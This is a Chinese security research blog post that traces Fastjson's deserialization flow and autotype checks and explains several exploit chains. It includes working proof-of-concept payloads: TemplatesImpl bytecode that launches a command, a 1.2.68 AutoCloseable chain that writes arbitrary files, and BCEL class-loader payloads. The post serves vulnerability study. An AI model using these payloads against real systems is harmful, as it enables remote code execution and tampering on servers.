# Fastjson

## 简介

Fastjson是Alibaba开发的Java语言编写的高性能JSON库，用于将数据在JSON和Java Object之间互相转换，提供两个主要接口JSON.toJSONString和JSON.parseObject/JSON.parse来分别实现序列化和反序列化操作。
项目地址：https://github.com/alibaba/fastjson

## 环境搭建

idea创建maven，修改对应的版本。

![image-20220830143331555](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209032001111.png)

## 总结

根据方法与传参的不同，入口可能对应多个重载方法，但总体上与漏洞相关的逻辑大同小异：

1. 解析器初始化，调用解析方法
2. 加载`@type`指定的类对象和与之对应的`Deserializer`
3. 如果类名在`denyList`中就抛出异常（黑名单）
4. 如果是`JavaBeanDeserializer`，会通过内省获取方法和属性
5. 获取到`defaultConstructor`则会进入第六步
6. 将满足条件的setter与getter及相关属性，封装为`FieldInfo`类并加入`fieldList`
7. 将`Deserializer`缓存进`IdentityHashMap`
8. 获取各个属性对应的`FieldValueDeserilizer`，反序列化属性对象
9. 由`setValue`根据属性类型，按照不同方式还原类对象属性

## 序列化与反序列化

反序列化的过程中有一下几个重要的点。

1、序列化对象为字符串：`toJSONString` 方法：1、JSON.toJSONString(xs) 2、JSON.toJSONString(xs,SerializerFeature.WriteClassName)

2、反序列化还原回 **Object** 的方法：parseObject(String text) `、`parse (String text)`、`parseObject(String text, Class\ clazz)。

其中 `parseObject`返回 `JSONObject` 而 `parse` 返回的是实际类型的对象。

在反序列化的过程里会自动去调用反序列化对象中的 getter、setter方法以及构造函数，这就是 Fastjson 反序列化漏洞产生的原因。

那么抛出一个问题是不是只要使用了JSON.parseObject(s)就会调用所有的getter和setter方法呢？

答案肯定是否的！！

这里还有个注意点，低版本不会有获取其他有参构造器的函数。
![image-20220902231529609](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209032001808.png)

## 反序列化流程分析

### DefaultJSONParser#parse

这里给this.lexer初始化一个值为12。

判断需反序列化的字符串第一位是什么。

![image-20220830151142099](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209032001607.png)

这里获取了key=@type

![image-20220830152023120](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209032000814.png)

开启autotype  Feature.DisableSpecialKeyDetect ，在1.2.25之后将（默认关闭的情况下不能反序列化类）。

TypeUtils.loadClass去加载该类。

![image-20220830152613943](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209032000966.png)

这里进行了ClassName的起始字符做了判断如果存在`[`，`L；`，将进行loadClass进行加载。（这对后续的绕过黑名单有作用）。

![image-20220830152826116](C:\Users\18282\AppData\Roaming\Typora\typora-user-images\image-20220830152826116.png)

这里使用config.getDeserializer进行获取该类。

![image-20220830153601190](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209032000362.png)

然后会来到黑名单的判断。

![image-20220830153718121](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209032000384.png)

这里会使用createJavaBeanDeserializer生成处理类。（详细流程就不分析了，这里提一点其中的JavaBeanInfo.build）程序将会创建一个fieldList数组来存放后续将要处理的目标类的 setter
方法及某些特定条件的 getter方法。

`第一步先获取set方法`。

![image-20220830154954635](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209032000543.png)

`(methodName.length() >= 4 && !Modifier.isStatic(method.getModifiers()) && (method.getReturnType().equals(Void.TYPE) || method.getReturnType().equals(method.getDeclaringClass())))`

##### 1、方法名大于等于4  2、该方法是静态方法  3、该方法返回值类型为void类型  4、返回类型的class和方法返回声明的Class对象

同时这里判断了

5、方法名为set开头 6、长度不小于5  

![image-20220830160237185](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209032000665.png)

7、根据setter方法名从第四个字符开始确定字段field名称（需把第一个字符转小写），若是boolean类型，则需把字段第一个字符转大写，然后前面拼接is

![image-20220830162808759](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209032000987.png)

8、根据字段名获取到字段Field后，判断是否注解了JSONField，获取JSONField注解，确定字段field名称，然后和方法添加到集合中

![image-20220830162854509](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209032000085.png)

`第二步获取getter方法`

`(methodName.length() >= 4 && !Modifier.isStatic(method.getModifiers()) && methodName.startsWith("get") && Character.isUpperCase(methodName.charAt(3)) && method.getParameterTypes().length == 0 && (Collection.class.isAssignableFrom(method.getReturnType()) || Map.class.isAssignableFrom(method.getReturnType()) || AtomicBoolean.class == method.getReturnType() || AtomicInteger.class == method.getReturnType() || AtomicLong.class == method.getReturnType()))`

```
1. 判断方法名长度是否大于4，不大于4则跳过
2. 静态方法跳过
3. 判断方法名称是否get前缀，并且第四个字符为大写，不符合则跳过
4. 方法有入参则跳过
5. 方法返回值不是Collection.class、Map.class、AtomicBoolean.class、AtomicInteger.class、AtomicLong.class或其子孙类则跳过
6. 获取方法上的注解JSONField，根据注解取字段名称
7. 根据getter方法名从第四个字符开始确定字段field名称（需把第一个字符转小写），若是boolean类型，则需把字段第一个字符转大写
8. 根据字段名获取到字段Field后，判断是否注解了JSONField，获取JSONField注解，确定字段field是否可以被反序列化，不可被反序列化则跳过
9. 根据字段名获取集合中是否已有FieldInfo，有则跳过
```

后续进入deserializer.deserialze。（通过内部的ASM，调试无法看到）

可以断点到触发点，看一下流程。

后续久省略了。那回过头来想。其实我们在讲到TemplateImpl那条链子的时候是不是满足触发fastjson这条链子呢？

## 总结

parseObject(String text, Class\ clazz)

```
setter
方法名长度大于4且以set开头
非静态函数		
返回类型为void或当前类
参数个数为1个
方法为 public 属性

getter
方法名需要长于4
非静态方法
以 get 字符串开头，且第四个字符需要是大写字母
方法不能有参数
返回值类型继承自Collection \|\| Map \|\| AtomicBoolean \|\| AtomicInteger \|\|AtomicLong
getter 方法对应的属性只能有 getter 不能有setter方法
方法为 public 属性
```

parseObject(String text)

```
setter
方法名长度大于4且以set开头
非静态函数		
返回类型为void或当前类
参数个数为1个
public 属性

getter
方法名长度大于4且以get开头
非静态函数		
方法不能有参数
public 属性
```

parse (String text)

```
setter
方法名长度大于4且以set开头
非静态函数		
返回类型为void或当前类
参数个数为1个
public 属性

getter
方法名需要长于4
非静态方法
以 get 字符串开头，且第四个字符需要是大写字母
方法不能有参数
返回值类型继承自Collection \|\| Map \|\| AtomicBoolean \|\| AtomicInteger \|\|AtomicLong
getter 方法对应的属性只能有 getter 不能有setter方法
方法为 public 属性
```

## TemplateImpl

直接上Poc。

```
package templateimpl;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.Feature;

public class Demo {
    public static void main(String[] args) {
        String s="{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"yv66vgAAADQANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABRMeHN3NmEvRmFzdGpzb25FaXZsOwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAJaGFGbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwAtAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAXQHAC4BAApTb3VyY2VGaWxlAQARRmFzdGpzb25FaXZsLmphdmEMAAgACQcALwwAMAAxAQAIY2FsYy5leGUMADIAMwEAEnhzdzZhL0Zhc3Rqc29uRWl2bAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAcAAAAAAAQAAQAIAAkAAgAKAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAsAAAAOAAMAAAANAAQADgANAA8ADAAAAAwAAQAAAA4ADQAOAAAADwAAAAQAAQAQAAEAEQASAAEACgAAAEkAAAAEAAAAAbEAAAACAAsAAAAGAAEAAAATAAwAAAAqAAQAAAABAA0ADgAAAAAAAQATABQAAQAAAAEAFQAWAAIAAAABABcAGAADAAEAEQAZAAIACgAAAD8AAAADAAAAAbEAAAACAAsAAAAGAAEAAAAYAAwAAAAgAAMAAAABAA0ADgAAAAAAAQATABQAAQAAAAEAGgAbAAIADwAAAAQAAQAcAAkAHQAeAAIACgAAAEEAAgACAAAACbsABVm3AAZMsQAAAAIACwAAAAoAAgAAABsACAAcAAwAAAAWAAIAAAAJAB8AIAAAAAgAAQAhAA4AAQAPAAAABAABACIAAQAjAAAAAgAk\"],\"_name\":\"a.b\",\"_tfactory\":{},\"_outputProperties\":{ }}";
        JSONObject jsonObject = JSON.parseObject(s, Feature.SupportNonPublicField);
    }
}
```

### 分析

获取默认构造函数也就是无参构造函数，判断获取到的无参构造函数是否存在，不存在则去获取构造的构造函数，也就是有参构造函数(默认会去找参数最多的那一个构造函数)，所以说当无参构造函数存在时直接就可以给所有属性赋值，包括私有属性。

![image-20220830180002682](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209032000566.png)

为什么base64编码？

![image-20220831002623920](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209032000428.png)

这里还有个细节！这里JavaBeanDeserializer#parseField-->this.smartMatch(key) 将key值中的特殊字符替换，达到可以Template加载。
![image-20220830190312391](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209032000732.png)

## 期望类

这个主要在1.2.68版本中！

问题点主要是在`checkAutoType`参数期望类这个地方！！
简单看一下哪些地方会调用`checkAutoType`方法并使用到期望类这个参数，发现这些地方！

![image-20220831221431667](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209032000378.png)

### Throwable

同样的方法在看一下ThrowableDeserializer在哪里调用了。

![image-20220831221726384](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209032000470.png)

非常熟悉！config.getDeserializer是不是在获取获取指定类型的[反序列化](https://so.csdn.net/so/search?q=反序列化&spm=1001.2101.3001.7020)器！
那么这里直接上poc分析了。
不同与之前的版本，这里进行了checkAutoType。其实就是一个校验和加载类的过程。

Feature.SafeMode.mask（禁用AutoType）或者类名长度不符合要求就会抛出异常。

![image-20220831222630174](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209032000297.png)

接下来就是一段黑名单匹配。匹配上了就会抛出异常。![image-20220831222951722](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209032000845.png)

这里的getClassFromMapping在com.alibaba.fastjson.util.TypeUtils#addBaseClassMappings被赋值，添加了一些基本类，后续被当作缓存使用。

```
private static void addBaseClassMappings(){
        mappings.put("byte", byte.class);
        mappings.put("short", short.class);
        mappings.put("int", int.class);
        mappings.put("long", long.class);
        mappings.put("float", float.class);
        mappings.put("double", double.class);
        mappings.put("boolean", boolean.class);
        mappings.put("char", char.class);
        mappings.put("[byte", byte[].class);
        mappings.put("[short", short[].class);
        mappings.put("[int", int[].class);
        mappings.put("[long", long[].class);
        mappings.put("[float", float[].class);
        mappings.put("[double", double[].class);
        mappings.put("[boolean", boolean[].class);
        mappings.put("[char", char[].class);
        mappings.put("[B", byte[].class);
        mappings.put("[S", short[].class);
        mappings.put("[I", int[].class);
        mappings.put("[J", long[].class);
        mappings.put("[F", float[].class);
        mappings.put("[D", double[].class);
        mappings.put("[C", char[].class);
        mappings.put("[Z", boolean[].class);
        Class<?>[] classes = new Class[]{
                Object.class,
                java.lang.Cloneable.class,
                loadClass("java.lang.AutoCloseable"),
                java.lang.Exception.class,
                java.lang.RuntimeException.class,
                java.lang.IllegalAccessError.class,
                java.lang.IllegalAccessException.class,
                java.lang.IllegalArgumentException.class,
                java.lang.IllegalMonitorStateException.class,
                java.lang.IllegalStateException.class,
                java.lang.IllegalThreadStateException.class,
                java.lang.IndexOutOfBoundsException.class,
                java.lang.InstantiationError.class,
                java.lang.InstantiationException.class,
                java.lang.InternalError.class,
                java.lang.InterruptedException.class,
                java.lang.LinkageError.class,
                java.lang.NegativeArraySizeException.class,
                java.lang.NoClassDefFoundError.class,
                java.lang.NoSuchFieldError.class,
                java.lang.NoSuchFieldException.class,
                java.lang.NoSuchMethodError.class,
                java.lang.NoSuchMethodException.class,
                java.lang.NullPointerException.class,
                java.lang.NumberFormatException.class,
                java.lang.OutOfMemoryError.class,
                java.lang.SecurityException.class,
                java.lang.StackOverflowError.class,
                java.lang.StringIndexOutOfBoundsException.class,
                java.lang.TypeNotPresentException.class,
                java.lang.VerifyError.class,
                java.lang.StackTraceElement.class,
                java.util.HashMap.class,
                java.util.Hashtable.class,
                java.util.TreeMap.class,
                java.util.IdentityHashMap.class,
                java.util.WeakHashMap.class,
                java.util.LinkedHashMap.class,
                java.util.HashSet.class,
                java.util.LinkedHashSet.class,
                java.util.TreeSet.class,
                java.util.ArrayList.class,
                java.util.concurrent.TimeUnit.class,
                java.util.concurrent.ConcurrentHashMap.class,
                java.util.concurrent.atomic.AtomicInteger.class,
                java.util.concurrent.atomic.AtomicLong.class,
                java.util.Collections.EMPTY_MAP.getClass(),
                java.lang.Boolean.class,
                java.lang.Character.class,
                java.lang.Byte.class,
                java.lang.Short.class,
                java.lang.Integer.class,
                java.lang.Long.class,
                java.lang.Float.class,
                java.lang.Double.class,
                java.lang.Number.class,
                java.lang.String.class,
                java.math.BigDecimal.class,
                java.math.BigInteger.class,
                java.util.BitSet.class,
                java.util.Calendar.class,
                java.util.Date.class,
                java.util.Locale.class,
                java.util.UUID.class,
                java.sql.Time.class,
                java.sql.Date.class,
                java.sql.Timestamp.class,
                java.text.SimpleDateFormat.class,
                com.alibaba.fastjson.JSONObject.class,
                com.alibaba.fastjson.JSONPObject.class,
                com.alibaba.fastjson.JSONArray.class,
        };
        for(Class clazz : classes){
            if(clazz == null){
                continue;
            }
            mappings.put(clazz.getName(), clazz);
        }
    }
```

这里的Throwable不在其中，所有我们需要手动添加ParserConfig.getGlobalInstance().setAutoTypeSupport(true);所以这个洞（利用方式，肯定还有其他的利用方式）变得很鸡肋。
接着就直接加载该类了！
![image-20220831223649948](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209032000454.png)

然后后续会进行判读继承或实现javax.sql.DataSource、javax.sql.RowSet类，如果满足以上条件则直接抛出异常

![image-20220831223755284](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209031959137.png)

然后返回clazz。
接着进行调用config.getDeserializer，进行加载反序列化器加载。
![image-20220831224256674](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209031959744.png)

接着继续调用，跟进会发现，这里会接着判断第二key是否为@type，然后进入第二次checkAutoType。![image-20220831224528553](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209031959950.png)

![image-20220831224635290](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209031959480.png)

然后会将Eivl这个恶意类进行加载。跟之前的步骤是一样的。后续会继续进行反射给cmd赋值！

创建一个实例，用上刚才传入的参数。

![image-20220831225223703](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209031959741.png)

最后通过这里反射将值赋值。![image-20220831225428847](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209031959341.png)

### AutoCloseables

其实过程跟上述过程差不多！

![image-20220831233036107](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209031959849.png)

但是这里还可以引入一个新的key，`$ref`

在分析过程中，反序列化操作时，我们还发现存在一个key `$ref`

![image-20220901133555139](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209031959057.png)

简单来说就是从其他地方获取一个对象当作参数传进去！

## 文件RCE

会发现报错。这里有篇文章讲解的挺好。
https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg其中只看一部分代码就行。
然后这里有个疑惑如何查看jdk自带的class文件呢？javap -l FileWrite.class (本人直接复制变成java文件然后javap的)
跟大佬学挖掘！

### commons-io 

- commons-io 库是非常常见的第三方库
- commons-io 库里的类字节码带有LocalVariableTable 调试信息
- commons-io 库里几乎没有类在 fastjson 黑名单中
- commons-io 库里基本都是跟 io 相关的类，跟 AutoCloseable 关联性比较强，可探索的地方很多

这里就拿浅蓝师傅的poc来分析了。

```
package FileTrue;

import com.alibaba.fastjson.JSON;
import com.esotericsoftware.kryo.io.Output;
import com.sleepycat.bind.serial.SerialOutput;
import org.eclipse.core.internal.localstore.SafeFileInputStream;


public class Demo3 {
    public static void main(String[] args) {

        String s = "{\n" +
                "    \"stream\": {\n" +
                "        \"@type\": \"java.lang.AutoCloseable\",\n" +
                "        \"@type\": \"org.eclipse.core.internal.localstore.SafeFileOutputStream\",\n" +
                "        \"targetPath\": \"F:\\\\Fastjson1.2.68\\\\xs.txt\",\n" +
                "        \"tempPath\": \"F:\\\\Fastjson1.2.68\\\\xs.txt\"\n" +
                "    },\n" +
                "    \"writer\": {\n" +
                "        \"@type\": \"java.lang.AutoCloseable\",\n" +
                "        \"@type\": \"com.esotericsoftware.kryo.io.Output\",\n" +
                "        \"buffer\": \"YjF1M3I=\",\n" +
                "        \"outputStream\": {\n" +
                "            \"$ref\": \"$.stream\"\n" +
                "        },\n" +
                "        \"position\": 5\n" +
                "    },\n" +
                "    \"close\": {\n" +
                "        \"@type\": \"java.lang.AutoCloseable\",\n" +
                "        \"@type\": \"com.sleepycat.bind.serial.SerialOutput\",\n" +
                "        \"out\": {\n" +
                "            \"$ref\": \"$.writer\"\n" +
                "        }\n" +
                "    }\n" +
                "}";
        JSON.parseObject(s);
    }
}

```

重要的关键这几个类。
`org.eclipse.core.internal.localstore.SafeFileOutputStream`

![image-20220902201043631](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209031959187.png)

`com.esotericsoftware.kryo.io.Output`
Output 中有一个 `flush` 方法，调用 outputStream 对象的 write 和 flush 方法将内容输出到了文件中。

![image-20220902201423328](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209031959036.png)

`com.sleepycat.bind.serial.SerialOutput`

![image-20220902201534463](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209031959231.png)

super中会调用setBlockDataMode，从而调用drain，在write中会触发flush方法。而我们使用$.write,刚好是要触发flush，从而写入文件了。并且文件名是可控的。

## BCEl

不多叙述过程了。具体可看[p神](https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html)
这里PoC结构上还有一个值得注意的地方 为什么这么设计呢？

FastJson中的 JSON.parse() 会识别并调用目标类的 setter 方法以及某些满足特定条件的 getter 方法，然而 getConnection() 并不符合特定条件（`返回类型`），所以正常来说在 FastJson 反序列化的过程中并不会被调用。

```
{
    {
        "@type": "com.alibaba.fastjson.JSONObject",
        "x":{
                "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
                "driverClassLoader": {
                    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName": "$$BCEL$$$l$8b$I$A$..."
        }
    }: "x"
}
```

```
{
        "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
        "driverClassLoader": {
            "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
        },
        "driverClassName": "$$BCEL$$$l$8b......"
}
```

注意点：
比如：6.0.53、7.0.81等版本。MVN 依赖写法如下

```
<!-- https://mvnrepository.com/artifact/org.apache.tomcat/dbcp -->
<dependency>
    <groupId>org.apache.tomcat</groupId>
    <artifactId>dbcp</artifactId>
    <version>6.0.53</version>
</dependency>
```

在Tomcat 8.0之后包路径有所变化，更改为了 org.apache.tomcat.dbcp.dbcp2.BasicDataSource，所以构造PoC的时候需要注意一下。 MVN依赖写法如下：

```
<!-- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-dbcp -->
<dependency>
    <groupId>org.apache.tomcat</groupId>
    <artifactId>tomcat-dbcp</artifactId>
    <version>9.0.8</version>
</dependency>
```

然后这里继续理解一下`$ref`

```
        String s = "{\n" +
                "    \"name\":\n" +
                "    {\n" +
                "        \"@type\" : \"java.lang.Class\",\n" +
                "        \"val\"   : \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\"\n" +
                "    },\n" +
                "    \"x\" : {\n" +
                "        \"name\": {\n" +
                "            \"@type\" : \"java.lang.Class\",\n" +
                "            \"val\"   : \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "        },\n" +
                "        \"y\": {\n" +
                "            \"@type\":\"com.alibaba.fastjson.JSONObject\",\n" +
                "            \"c\": {\n" +
                "                \"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
                "                \"driverClassLoader\": {\n" +
                "                    \"@type\" : \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "                },\n" +
                "                \"driverClassName\":\"$$BCEL$$" + code + "\",\n" +
                "\n" +
                "                     \"$ref\": \"$.x.y.c.connection\"\n" +
                "\n" +
                "            }\n" +
                "        }\n" +
                "    }\n" +
                "}";

```

这里的$.x.y.c.connection，实际是引用了BasicDataSource.getConnection。
具体触发点在这里。
![image-20220903192449815](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209031958758.png)

嗯~fastjson就差不多这样吧。